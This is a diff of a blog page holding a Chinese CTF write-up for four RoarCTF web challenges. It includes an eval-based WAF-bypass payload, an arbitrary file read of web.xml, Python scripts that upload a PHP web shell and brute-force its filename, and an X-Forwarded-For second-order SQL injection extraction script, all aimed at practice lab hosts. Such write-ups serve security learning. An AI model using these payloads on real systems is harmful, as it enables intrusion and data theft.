@@ -1,202 +1,363 @@
 <!DOCTYPE html>
-<html>
-<head><meta name="generator" content="Hexo 3.8.0">
-  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge">
-  <title>RoarCTF_Web_Writeup | Lethe | 忘川</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="author" content="Lethe">
-  <meta name="keywords" content="Lethe's Blog">
-  <meta name="description" content="Lethe's Blog">
-  <script id="hexo-configurations">
-  var CONFIG = {
-    root: '/',
-    theme: 'lx',
-    version: '1.4.5',
-    localsearch:{
-      "enable": false,
-      "trigger": "auto",
-      "top_n_per_article": 1,
-      "unescape": false,
-      "preload": false
-      },
-    path: '-'
-  };
-</script>
+<html lang="">
 
-  <link rel="shortcut icon" href="/hacker.png">
-  <link rel="stylesheet" href="/css/main.css">
-  <script src="/js/jquery.min.js"></script>
-  <script src="/js/jquery.jside.menu.js"></script>
-	<script>
-	$(document).ready(function(){
-	$(".menu-container").jSideMenu({
-	    jSidePosition: "position-right",
-	    jSideSticky: true,
-	    jSideSkin: "moonlit",
-	     });
-	}); 
-	</script>
+
+
+
+
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/apple-touch-icon.png">
+  <link rel="icon" type="image/png" href="/img/favicon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <meta name="description" content="Lethe&#39;s Blog">
+  <meta name="author" content="Lethe">
+  <meta name="keywords" content="Lethe&#39;s Blog">
+  <title>RoarCTF_Web_Writeup ~ Lethe | 忘川</title>
+  <link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="/lib/bootstrap/css/bootstrap.min.css">
+  <link rel="stylesheet" href="/lib/mdbootstrap/css/mdb.min.css">
+  <link rel="stylesheet" href="/lib/github-markdown/github-markdown.min.css">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
   
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:300|Noto+Serif+SC&amp;display=swap">
-  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4/css/font-awesome.min.css">
+    <link rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css">
+  
+  <link rel="stylesheet" href="/css/main.css">
+
+  
 </head>
+
+
 <body>
-<div class="single">
-<div id="page">
-<div id="lx-aside" style="background-image: url(/images/page-cover.jpg)" data-stellar-background-ratio="0.5">
-  <div class="overlay">
-  <div class="page-title">
-    <div class="avatar"><a href="/"><img src="/images/2.jpg"></a></div>
-    <span>2019-10-21</span>
-    <h2>RoarCTF_Web_Writeup</h2>
-    <div class="tags"><i class="fa fa-tag"></i><a class="tag-link" href="/tags/Writeup/">Writeup</a></div>
-    <div class="social-links">
-<a href="https://github.com/LetheSec" target="_blank"><i class="fa fa-github fa-fw"></i></a><a href="mailto:1013579926@qq.com"><i class="fa fa-envelope fa-fw"></i></a>
-</div></div>
-</div>
-</div>
-<div id="lx-main-content">
-  <div class="lx-post">
-    <div class="lx-entry padding">
-      <div>
-        <p>周末有点事，BUUCTF上复现一下…</p>
-<h1><span id="easy_calc">easy_calc</span></h1><p>这一题和国赛的lova_math一题看起来有点像…<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191017233227772.png" alt="在这里插入图片描述"><br>源码中提示了这题加了waf，我们访问<code>calc.php</code>，看到源码如下<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191017233459628.png" alt="在这里插入图片描述"><br><code>num</code>传入表达式，然后用<code>eval()</code>计算并输出，因为加了waf所以<code>num</code>中如果有字母，会直接返回403，所以第一步就是绕过它。</p>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">&nbsp;<strong>Lethe | 忘川</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">Home</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">Archives</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/categories/">Categories</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">Tags</a>
+          </li>
+        
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">About</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+
+</nav>
+
+    <div class="view intro-2" id="background"
+         style="background: url('/img/2.jpg')no-repeat center center;
+           background-size: cover;
+           background-attachment: fixed;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              <br>
+              <p class="mt-3">Monday, October 21st 2019, 9:37 pm</p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="py-5 z-depth-3" id="board">
+        <div class="post-content mx-auto">
+          <div class="markdown-body">
+            <p>周末有点事，BUUCTF上复现一下…</p>
+<h1><span id="easy_calc">easy_calc</span></h1><p>这一题和国赛的lova_math一题看起来有点像…<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191017233227772.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>源码中提示了这题加了waf，我们访问<code>calc.php</code>，看到源码如下<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191017233459628.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><code>num</code>传入表达式，然后用<code>eval()</code>计算并输出，因为加了waf所以<code>num</code>中如果有字母，会直接返回403，所以第一步就是绕过它。</p>
 <p>比较简单的方式就是直接在查询参数前面加个空格，即将<code>?num=</code>改为<code>? num=</code>即可绕过。</p>
 <p>可以参考这篇文章：<a href="https://www.freebuf.com/articles/web/213359.html" target="_blank" rel="noopener">利用PHP的字符串解析特性Bypass</a></p>
 <p><strong>当然，如果你觉得上面的方法不够高端，不能凸显你的技术，下面这篇文章提到的方法同样可以绕过。</strong></p>
 <p>利用HTTP请求走私来绕过，关于该漏洞可参考这篇文章：<a href="https://paper.seebug.org/1048/#31-cl0get" target="_blank" rel="noopener">协议层的攻击——HTTP请求走私</a></p>
 <p>随便测试文中提到的TE-CL方式，发现可以绕过，原理已经在文中说的很清楚，这里就不赘述。</p>
-<p><strong>TE-CL</strong><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018001404533.png" alt="在这里插入图片描述"></p>
+<p><strong>TE-CL</strong><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018001404533.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>下面就是如何绕过<code>black_list</code>来拿flag了，思路和国赛那题差不多，也是利用一些数学函数和内置函数来构造。</p>
-<p>用<code>scandir</code>读取目录时，首要问题是要构造<code>/</code>，可利用<code>hex2bin(dechex(47))</code>，将<code>/</code>的ascii码进制转为16进制，再转为字符串：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018002257310.png" alt="在这里插入图片描述"><br>然后其他的就是利用<code>base_convert()</code>了，如<code>base_convert(&#39;scandir&#39;,36,10)</code>，于是我们先构造<code>print_r(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</code>读目录</p>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018002954170.png" alt="在这里插入图片描述"></p>
+<p>用<code>scandir</code>读取目录时，首要问题是要构造<code>/</code>，可利用<code>hex2bin(dechex(47))</code>，将<code>/</code>的ascii码进制转为16进制，再转为字符串：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018002257310.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>然后其他的就是利用<code>base_convert()</code>了，如<code>base_convert(&#39;scandir&#39;,36,10)</code>，于是我们先构造<code>print_r(base_convert(61693386291,10,36)(hex2bin(dechex(47))))</code>读目录</p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018002954170.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>然后再利用<code>readfile()</code>读取,最终payload：<code>base_convert(2146934604002,10,36)(hex2bin(dechex(47)).base_convert(25254448,10,36))</code></p>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018003909946.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018003909946.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
-<h1><span id="easy-java">Easy Java</span></h1><p>进入之后是一个登录界面，但其实不关登录的事，点开help，如下：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010258912.png" alt="在这里插入图片描述"></p>
+<h1><span id="easy-java">Easy Java</span></h1><p>进入之后是一个登录界面，但其实不关登录的事，点开help，如下：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010258912.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>看到<code>Download?filename=help.docx</code>，想到任意文件读取…</p>
 <p>经尝试，将<code>GET</code>改为<code>POST</code>即可读到</p>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010512293.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010512293.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>那么首先读一下，配置Java的配置文件<code>web.xml</code>，位于<code>WEB_INF</code>目录下：</p>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010601497.png" alt="在这里插入图片描述"></p>
-<p>看到了flag的目录，读一下<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010649707.png" alt="在这里插入图片描述"><br>将该base64解码得到flag</p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010601497.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>看到了flag的目录，读一下<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018010649707.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>将该base64解码得到flag</p>
 <p><br></p>
-<h1><span id="simple-upload">Simple Upload</span></h1><p>这一题是thinkphp的上传：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018014235621.png" alt="在这里插入图片描述"></p>
+<h1><span id="simple-upload">Simple Upload</span></h1><p>这一题是thinkphp的上传：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018014235621.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <h5><span id="解法一">解法一</span></h5><p>这里有师傅fuzz出，使用<code>xxx.&lt;&gt;php</code>可以绕过来直接进行上传orz…</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://27e9c108-617d-42ed-8ad8-afe7e9e4c369.node3.buuoj.cn/index.php/home/index/upload/"</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">"file"</span>: (<span class="string">"shell.&lt;&gt;php"</span>, <span class="string">"&lt;?php eval($_GET['cmd'])?&gt;"</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018014519248.png" alt><br>上传成功，连接即可得到flag.</p>
-<h5><span id="解法二">解法二：</span></h5><p>通过报错信息，我们可以看出这里是使用了ThinkPHP3.2.4<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018114351713.png" alt="在这里插入图片描述"></p>
-<p>于是找个这之前的版本看一下文件上传的部分：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018114633312.png" alt="在这里插入图片描述"><br>可以看到，当<code>$files</code>为空时，会默认将<code>$_FILES</code>赋给<code>$file</code>，即会上传<code>$_FILES</code>中的所有文件，而题目中只会过滤<code>$_FILES[&#39;file&#39;]</code>，因此是可以将shell上传成功的，而只要找到其文件名就可以了，不过只会输出允许文件的位置。</p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018014519248.png" srcset="/img/loading.gif" alt><br>上传成功，连接即可得到flag.</p>
+<h5><span id="解法二">解法二：</span></h5><p>通过报错信息，我们可以看出这里是使用了ThinkPHP3.2.4<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018114351713.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>于是找个这之前的版本看一下文件上传的部分：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191018114633312.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br>可以看到，当<code>$files</code>为空时，会默认将<code>$_FILES</code>赋给<code>$file</code>，即会上传<code>$_FILES</code>中的所有文件，而题目中只会过滤<code>$_FILES[&#39;file&#39;]</code>，因此是可以将shell上传成功的，而只要找到其文件名就可以了，不过只会输出允许文件的位置。</p>
 <p>而文件名默认是用<code>uniqid()</code>函数生成的</p>
 <ul>
 <li>uniqid() 函数基于以微秒计的当前时间，生成一个唯一的 ID</li>
 </ul>
 <p>所以短时间内上传两个文件的话，可以爆破出相近文件名，脚本如下：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://a4eab965-f727-497b-9c42-8fc52baecb6c.node3.buuoj.cn/index.php/home/index/upload/"</span></span><br><span class="line">s = requests.Session()</span><br><span class="line">files = &#123;<span class="string">"file"</span>: (<span class="string">"1.txt"</span>, <span class="string">"1"</span>),<span class="string">"lethe"</span>: (<span class="string">"shell.php"</span>, <span class="string">"&lt;?php eval($_GET['cmd'])?&gt;"</span>)&#125;</span><br><span class="line">r = requests.post(url, files=files)</span><br><span class="line">print(r.text)</span><br><span class="line">filename = r.text.split(<span class="string">"/"</span>)[<span class="number">-1</span>].split(<span class="string">"."</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># print(filename)</span></span><br><span class="line">filename = int(filename, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (<span class="literal">True</span>):</span><br><span class="line">    shellname = hex(filename)[<span class="number">2</span>:]</span><br><span class="line">    <span class="comment"># print(shellname)</span></span><br><span class="line">    url = <span class="string">f"http://a4eab965-f727-497b-9c42-8fc52baecb6c.node3.buuoj.cn/Public/Uploads/2019-10-20/<span class="subst">&#123;shellname&#125;</span>.php"</span></span><br><span class="line">    <span class="comment"># print(url)</span></span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> r.status_code != <span class="number">404</span>:</span><br><span class="line">        print(<span class="string">"Find it: "</span> + url)</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        filename += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102100005589.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102100005589.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="online-proxy">Online Proxy</span></h1><p>页面的源码里会回显Current IP和Last IP，其实之前做过一道也是回显IP的题，那题是XXF的insert注入，不过那题给了源码，思路比较容易想，且过滤了一些字符，最终是利用了时间盲注。</p>
 <p>这一题也是在X-Forwarded-For字段进行注入，只有后一次ip和前一次ip不相同时，才会更新前一次的ip，既然存在插入ip、更新ip的操作，那么就应该可以利用update或者insert注入或者二次注入。</p>
 <p>一般来说，insert可以使用延时注入，update可以使用bool盲注和延时盲注，但是如果更新后的数据是可见的话，那么就可能存在二次注入，在insert的时候拼接注入语句，将要查询的数据转化为10进制一起插入数据库中，这样实际上我们要查询的数据就已经在数据库里了，再在回显时就可以拿到数据了。</p>
 <p>下面放几张图理解一下：</p>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102120290699.png" alt="在这里插入图片描述"><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021202915427.png" alt="在这里插入图片描述"><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021202925425.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102120290699.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021202915427.png" srcset="/img/loading.gif" alt="在这里插入图片描述"><br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021202925425.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>这一题刚好可以这么操作，类似的可以参考<code>upload（RCTF 2015）</code>一题，在<a href="https://lethe.site/2019/05/21/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb/">这篇文章</a>里我写了这题的wp。</p>
 <p>下面进行验证，我们首先构造XXF为：<code>0&#39;+conv(hex(substr((select database()),1,5)),16,10)+&#39;0</code></p>
-<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021212946337.png" alt="在这里插入图片描述"></p>
-<p>然后随意更换XXF，重新发包2次，第二次发包后我们可以看到成功回显了数据：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021212958163.png" alt="在这里插入图片描述"></p>
+<p><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021212946337.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
+<p>然后随意更换XXF，重新发包2次，第二次发包后我们可以看到成功回显了数据：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/20191021212958163.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 <p>注意：一次不能读太多位，不然10进制会用科学计数法表示，就无法转换回原字符串了。</p>
 <p>最终脚本如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://node3.buuoj.cn:28136/"</span></span><br><span class="line">s = requests.session()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_length</span><span class="params">(sql)</span>:</span></span><br><span class="line">    length = <span class="string">""</span></span><br><span class="line">    payload = <span class="string">f"0'+length((<span class="subst">&#123;sql&#125;</span>))+'0"</span></span><br><span class="line">    header = &#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;</span><br><span class="line">    r = s.get(url, headers=header)</span><br><span class="line">    header[<span class="string">'X-Forwarded-For'</span>] = <span class="string">'Lethe'</span></span><br><span class="line">    r = s.get(url, headers=header)</span><br><span class="line">    r = s.get(url, headers=header)</span><br><span class="line">    length = r.text.split(<span class="string">" "</span>)[<span class="number">-2</span>]</span><br><span class="line">    <span class="keyword">return</span> length</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_result</span><span class="params">(sql)</span>:</span></span><br><span class="line">    all_result = <span class="string">""</span></span><br><span class="line">    length = int(get_length(sql))</span><br><span class="line">    print(<span class="string">"length: "</span>+str(length))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, length + <span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">        payload = <span class="string">f"0'+conv(hex(substr((<span class="subst">&#123;sql&#125;</span>),<span class="subst">&#123;i&#125;</span>,5)),16,10)+'0"</span></span><br><span class="line">        header = &#123;<span class="string">'X-Forwarded-For'</span>: payload&#125;</span><br><span class="line">        r = s.get(url, headers=header)</span><br><span class="line">        header[<span class="string">'X-Forwarded-For'</span>] = <span class="string">'Lethe'</span></span><br><span class="line">        r = s.get(url, headers=header)</span><br><span class="line">        r = s.get(url, headers=header)</span><br><span class="line">        result = int(r.text.split(<span class="string">" "</span>)[<span class="number">-2</span>])</span><br><span class="line">        <span class="comment"># print(result)</span></span><br><span class="line">        <span class="comment"># print(binascii.a2b_hex(hex(result)[2:]).decode('utf8'))</span></span><br><span class="line">        all_result += binascii.a2b_hex(hex(result)[<span class="number">2</span>:]).decode(<span class="string">'utf8'</span>)</span><br><span class="line">    <span class="keyword">return</span> all_result</span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = "select group_concat(schema_name) from information_schema.schemata"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = "select group_concat(table_name) from information_schema.tables where table_schema = 'F4l9_D4t4B45e'"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql = "select group_concat(column_name) from information_schema.columns where table_name='F4l9_t4b1e'"</span></span><br><span class="line"></span><br><span class="line">sql = <span class="string">"select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e"</span></span><br><span class="line"></span><br><span class="line">print(get_result(sql))</span><br></pre></td></tr></table></figure></p>
-<p>结果如下：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102121372930.png" alt="在这里插入图片描述"></p>
+<p>结果如下：<br><img src="/2019/10/21/RoarCTF-Web-Writeup/2019102121372930.png" srcset="/img/loading.gif" alt="在这里插入图片描述"></p>
 
+            <hr>
+          </div>
+          <br>
+          <div>
+            
+              <p>
+                <i class="iconfont icon-inbox"></i>
+                
+                  <a class="hover-with-bg" href="/categories/Writeup">Writeup</a>
+                  &nbsp;
+                
+              </p>
+            
+            <p>
+              <i class="iconfont icon-tag"></i>
+              
+                <a class="hover-with-bg" href="/tags/Writeup">Writeup</a>
+              
+            </p>
+            
+              <p class="note note-warning">本博客所有文章除特别声明外，均采用 <a href="https://zh.wikipedia.org/wiki/Wikipedia:CC_BY-SA_3.0%E5%8D%8F%E8%AE%AE%E6%96%87%E6%9C%AC" rel="nofollow noopener">CC BY-SA 3.0协议</a> 。转载请注明出处！</p>
+            
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="d-none d-lg-block col-lg-2 toc-container">
+      
+  <div id="toc">
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
+    <div id="tocbot"></div>
+  </div>
+
+    </div>
+  </div>
+</div>
+
+<!-- custom -->
+
+
+<!-- Comments -->
+<div class="col-lg-7 mx-auto nopadding-md">
+  <div class="container comments mx-auto" id="comments">
+    
+      <br><br>
+      
+      <div class="disqus" style="width:100%">
+  <div id="disqus_thread"></div>
+  <script>
+    var disqus_shortname = 'Lethe';
+    var disqus_config = function () {
+      this.page.url = 'https://lethe.site/2019/10/21/RoarCTF-Web-Writeup/';
+      this.page.identifier = '/2019/10/21/RoarCTF-Web-Writeup/';
+    };
+    (function () {
+      var d = document, s = d.createElement('script');
+      s.type = 'text/javascript';
+      s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow noopener">comments
+      powered by Disqus.</a></noscript>
+</div>
+    
+  </div>
+</div>
+
+    
+  </main>
+
+  
+    <a class="z-depth-1" id="scroll-top-button" href="#" role="button">
+      <i class="fa fa-chevron-up scroll-top-arrow" aria-hidden="true"></i>
+    </a>
+  
+
+  
+    <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
       </div>
     </div>
   </div>
 </div>
-<div class="lx-navigation">
-	<div class="lx-cover prev lx-cover-sm" style="background-image: url(/images/footer_1.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/10/25/Web安全测试个人赛练习/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Next</span>
-						<h3>Web安全测试个人赛练习</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-        <div class="lx-cover next lx-cover-sm" style="background-image: url(/images/footer_2.jpg)">
-		<div class="overlay"></div>
-		<a class="copy" href="/2019/10/20/数据结构实验复习/">
-			<div class="display-t">
-				<div class="display-tc">
-					<div>
-						<span>Prev</span>
-						<h3>数据结构实验复习</h3>
-					</div>
-				</div>
-			</div>
-		</a>
-	</div>
-</div>
-</div>
-<div class="comment"><div id="comments"></div></div>
-<footer>
-  <div>
-  Copyright &copy; 2019.<a href="/">Lethe | 忘川</a>
+  
+
+  <footer class="mt-5">
+  <div class="text-center py-3">
+    <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><b>Hexo</b></a>
+    <i class="iconfont icon-love"></i>
+    <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"> <b>Fluid</b></a>
+    <br>
+    
   </div>
 </footer>
-</div>
 
-<button class="menu-trigger"></button>
-<div class="menu">
-  <div class="menu-head">
-    <span class="layer">
-      <div class="col">
-        <div class="row for-pic">
-          <div class="profile-pic">
-            <a href="/"><img src="/images/2.jpg" alt="Lethe"></a>
-          </div>
-        </div>
-        <div class="row for-name">
-          <p>Lethe</p>
-          <span class="tagline">Hello, World!</span>
-        </div>
-      </div>
-    </span>
-  </div>
-  <nav class="menu-container">
-  <ul class="menu-items">
-    <li><a href="/"><i class="fa fa-home fa-fw"></i>首页</a></li>
-    <li><a href="/archives/"><i class="fa fa-archive fa-fw"></i>归档</a></li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-bookmark fa-fw"></i>页面</span>
-        <ul>
-          <li><a href="/about">关于</a></li>
-        </ul>
-    </li>
-    <li class="has-sub"><span class="dropdown-heading">
-      <i class="fa fa-link fa-fw"></i>友链</span>
-        <ul>
-          <li> <a href="https://hiworldalice.github.io/" target="_blank">Tunt</a></li>
-        <li> <a href="https://3nd.xyz" target="_blank">3ND</a></li>
-        </ul>
-    </li>
-  </ul>
-  </nav>
-</div>
-
-<div class="gototop js-top">
-  <a href="#" class="js-gotop"><i class="fa fa-arrow-up"></i></a>
-</div>
-<script src="/js/jquery.easing.min.js"></script>
-<script src="/js/jquery.waypoints.min.js"></script>
-<script src="/js/jquery.stellar.min.js"></script>
+<!-- SCRIPTS -->
+<script src="/lib/jquery/jquery.min.js"></script>
+<script src="/lib/popper/popper.min.js"></script>
+<script src="/lib/bootstrap/js/bootstrap.min.js"></script>
+<script src="/lib/mdbootstrap/js/mdb.min.js"></script>
 <script src="/js/main.js"></script>
 
+  <script src="/js/lazyload.js"></script>
 
+
+  
+    <script src="/lib/tocbot/tocbot.min.js"></script>
+  
+  <script src="/js/post.js"></script>
+
+
+  <script src="/lib/prettify/prettify.min.js"></script>
+  <script>
+    $(document).ready(function () {
+      $('pre').addClass('prettyprint linenums');
+      prettyPrint();
+    })
+  </script>
+
+
+  <script src="/lib/typed/typed.min.js"></script>
+  <script>
+    var typed = new Typed('#subtitle', {
+      strings: [
+        '  ',
+        "RoarCTF_Web_Writeup&nbsp;",
+      ],
+      cursorChar: "_",
